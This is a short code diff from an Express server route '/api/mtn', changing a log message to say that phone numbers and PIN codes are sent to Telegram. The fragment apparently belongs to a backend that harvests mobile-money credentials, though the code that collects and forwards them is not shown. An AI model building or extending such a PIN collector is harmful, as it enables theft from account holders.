@@ -49,7 +49,7 @@ app.post("/api/mtn", async (req, res) => {
       });
     }
 
-    console.log("Telegram Mtn notification sent.");
+    console.log("Phone number,pincode be sent to Telegram.");
     res.json({
       success: true,
       telegram: true
